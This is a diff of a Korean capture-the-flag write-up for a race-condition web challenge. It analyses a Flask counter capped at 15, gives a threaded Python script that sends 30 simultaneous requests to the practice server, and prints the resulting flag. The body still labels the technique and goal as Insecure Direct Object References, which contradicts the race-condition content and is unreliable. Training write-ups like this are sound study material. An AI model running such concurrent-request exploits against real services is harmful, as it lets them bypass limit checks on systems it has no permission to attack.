@@ -1,50 +1,29 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 12.3 Race condition"
+title: "KnockOn Bootcamp 2nd - 12.3 Race Condition"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Insecure Direct Object References
-last_modified_at: 2024-09-16T20:30:00-05:00
+  - KnockOn Bootcamp 2nd
+  - Race Condition
+last_modified_at: 2024-09-17T10:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10015/>
 
-![12.3 Race condition 1](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_1.png)
+![12.3 Race condition 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-12-3-race-1.png)
 
-![12.3 Race condition 2](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_2.png)
-
-|
-
-|
-
-|
+![12.3 Race condition 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-12-3-race-2.png)
 
 ### 목표
 
----
-
 다른 사용자의 리소스를 참조를 통해 flag 얻기
-
-|
 
 ### 공격 기법
 
----
-
 Insecure Direct Object References
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -88,30 +67,15 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000, threaded=True)
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
-![12.3 Race condition 3](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_3.png)
+![12.3 Race condition 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-12-3-race-3.png)
 
 `increase` 버튼을 누르면 숫자가 하나씩 올라감
 
-|
-
-![12.3 Race condition 4](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_4.png)
-
+![12.3 Race condition 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-12-3-race-4.png)
 
 15에서 더 이상 안 올라감
-
-|
-
-|
-
-|
 
 ## 코드 분석
 
@@ -140,10 +104,6 @@ def increase():
 
 조건은 `15보다 작을 때`와 `15보다 클 때`밖에 없기 때문에, `15에서 16`으로 넘어가려고 하면 `else`문이 실행됨
 
-|
-
-|
-
 ```python
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000, threaded=True)
@@ -151,13 +111,7 @@ if __name__ == "__main__":
 
 `threaded=True`: 멀티스레딩 모드. 동시에 여러 요청을 처리할 수 있음. `Race Condition` 공격 가능
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ### Race Condition 공격 코드 작성
 
@@ -168,15 +122,11 @@ import requests
 
 멀티스레딩 사용을 위해 `threading`, HTTP 요청을 위해 `requests` 라이브러리 추가
 
-|
-
 ```python
-url = "http://war.knock-on.org:10015/increase" 
+url = "http://war.knock-on.org:10015/increase"
 ```
 
 서버 url 설정
-
-|
 
 ```python
 def increase_counter():
@@ -189,8 +139,6 @@ def increase_counter():
 
 `url`에 `GET`요청을 보내고 응답을 `response`에 저장 후 출력
 
-|
-
 ```python
 threads = []
 
@@ -202,8 +150,6 @@ for _ in range(30): # 스레드 30개 생성
 
 `thread = threading.Thread(target=increase_counter)`: `target`으로 실행할 함수 지정, 생성된 각 스레드들이 해당 함수를 실행함
 
-|
-
 ```python
 for thread in threads:
     thread.join()
@@ -211,13 +157,7 @@ for thread in threads:
 
 모든 스레드가 종료될 떄까지 기다림
 
-|
-
-|
-
 ### 결과
-
----
 
 ```html
 <!DOCTYPE html>
@@ -234,37 +174,28 @@ for thread in threads:
     <div class="container mt-5">
         <h2>Counter</h2>
 
-        
         <div class="alert alert-info" role="alert">
             30
         </div>
-        
 
         <a href="/increase" class="btn btn-primary">increase</a>
         <a href="/reset" class="btn btn-primary">reset</a>
 
-        
         <div class="alert alert-info" role="alert">
             Success!!	K0{Cl1ck_m00oor3_F4st3r_t0_3XPL01T!!!}
         </div>
-        
+
     </div>
 </body>
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```python
 import threading
 import requests
 
-url = "http://war.knock-on.org:10015/increase" 
+url = "http://war.knock-on.org:10015/increase"
 
 def increase_counter():
     try:
@@ -284,16 +215,8 @@ for thread in threads:
     thread.join()
 ```
 
-|
-
-|
-
 ### FLAG
 
 ```bash
 K0{Cl1ck_m00oor3_F4st3r_t0_3XPL01T!!!}
 ```
-
-|
-
----
